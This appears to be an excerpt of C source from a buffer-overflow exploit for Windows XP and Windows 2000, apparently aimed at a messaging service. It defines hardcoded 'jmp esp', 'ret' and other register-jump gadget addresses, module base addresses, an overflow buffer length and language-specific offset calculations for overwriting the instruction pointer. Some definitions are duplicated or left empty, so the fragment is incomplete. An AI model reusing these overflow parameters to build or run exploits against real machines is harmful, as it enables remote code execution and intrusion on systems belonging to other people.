
 #define  eipjmpespwinxp "\xb6\x37\xfc\x7f" //  "\xb7\x0e\xfa\x7f"
 #define  eipretwinxp    "\xb7\x37\xfc\x7f" //  "\xb8\x0e\xfa\x7f"

 #define  eipjmpespwinxp   "\xb7\x0e\xfa\x7f"
 #define  eipretwinxp      "\xb8\x0e\xfa\x7f"


 #define  eipjmpespwin2000 "\x77\x36\x31\x76" // "\xb6\x37\xfc\x7f"
 #define  eipretwin2000    "\x3b\x17\x3a\x74"  //ret 0x10 //"\xb7\x37\xfc\x7f"


 #define  eipjmpesiwin2000 "\xb9\x11\xfa\x7f"

 #define  eipjmpeaxwin2000 "\x2e\x36\xfc\x7f"
 #define  eipjmpebxwin2000 "\xbc\x36\xfc\x7f"

 #define  eipjmpebxwin2000all "\x33\x75\x18\x00"


 #define   RVAWINXP     0x74ec0000
 #define   RVAWIN2K     0x76810000
 
 #define   OVERBUFFLEN 
 #define   OVERBUFFLEN 0x11ca
 #define   ADDRESS  (OVERBUFFLEN+0x7)/8*8-0x21-2 //tw //0x21=strlen("从 *** test到 test的消息...")
// #define   ADDRESS  (OVERBUFFLEN+0x7)/8*8-0x21   //cn //0x21=strlen("从 *** test到 test的消息...")
// #define   ADDRESS  (OVERBUFFLEN+0x7)/8*8-0x24      //en //0x21=strlen("从 *** test到 test的消息...")
 #define   SENDBUFFLEN ADDRESS+7
